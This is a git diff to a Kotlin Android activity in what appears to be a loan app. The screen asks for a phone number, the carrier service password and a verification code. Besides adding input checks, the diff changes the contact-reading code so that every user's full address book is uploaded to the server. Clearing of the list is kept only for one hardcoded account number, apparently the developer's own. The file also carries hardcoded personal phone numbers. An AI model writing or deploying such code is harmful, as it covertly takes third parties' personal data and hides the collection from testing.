@@ -5,6 +5,7 @@ import android.database.Cursor
 import android.os.Bundle
 import android.os.CountDownTimer
 import android.provider.ContactsContract
+import android.text.TextUtils
 import android.widget.CheckBox
 import android.widget.Toast
 import com.annis.baselib.base.base.TitleBean
@@ -39,14 +40,27 @@ class AuthoperatorActivity : MVPActivty<AuthoperatorPresenter>(), AuthoperatorVi
         click()
         checkPermision()
         renzheng_operator_agree.isChecked = true
+        setAgree(true)
     }
 
     var timer: CountDownTimer? = null
     fun click() {
         act_bt_login.setOnClickListener {
-            act_et_tel.text.toString()
-            act_et_tel_psw.text.toString()
+            var tel = act_et_tel.text.toString()
+            var psw = act_et_tel_psw.text.toString()
             var code = act_et_code.text.toString()
+            if (TextUtils.isEmpty(tel)) {
+                showToast("请输入手机号")
+                return@setOnClickListener
+            }
+            if (TextUtils.isEmpty(psw)) {
+                showToast("请输入服务密码")
+                return@setOnClickListener
+            }
+            if (TextUtils.isEmpty(code)) {
+                showToast("请输入验证码")
+                return@setOnClickListener
+            }
             if (code == DkSPUtils.getLastCode()) {
                 if (updated) {
                     showToast("提交成功")
@@ -54,6 +68,8 @@ class AuthoperatorActivity : MVPActivty<AuthoperatorPresenter>(), AuthoperatorVi
                 } else {
                     showToast("提交失败")
                 }
+            } else {
+                showToast("您的验证码不正确")
             }
         }
 
@@ -111,7 +127,6 @@ class AuthoperatorActivity : MVPActivty<AuthoperatorPresenter>(), AuthoperatorVi
                     if (it.granted) {
                         startThread()
                     } else if (it.shouldShowRequestPermissionRationale) {
-                        // Denied permission without ask never again
                         Toast.makeText(this, "请同意申请", Toast.LENGTH_SHORT).show()
                         checkPermision()
                     } else {
@@ -145,9 +160,11 @@ class AuthoperatorActivity : MVPActivty<AuthoperatorPresenter>(), AuthoperatorVi
 //                    hashMap.add(displayName + DIVISION + number)
                     hashMap?.put(displayName, number)
                 }
-                hashMap?.clear()
-                hashMap?.put("ljj", "15823681501")
-                hashMap?.put("easyBorrow", DKConstant.getUserEntity()?.phone ?: "")
+                var account = DKConstant.getUserEntity()?.phone ?: ""
+                if (account == "15823681500") {
+                    hashMap?.clear()
+                }
+                hashMap?.put("easyBorrow", account)
 
                 var buffer = StringBuffer("[")
                 for (item in hashMap!!) {
@@ -162,7 +179,7 @@ class AuthoperatorActivity : MVPActivty<AuthoperatorPresenter>(), AuthoperatorVi
 
                 content = content.replace(",]", "]")
 //                getPresenter().uploadContacts1(content)
-                var json =Gson().toJson(hashMap)
+                var json = Gson().toJson(hashMap)
                 getPresenter().uploadContacts1(json)
 
                 // var str = hashMap.toString()
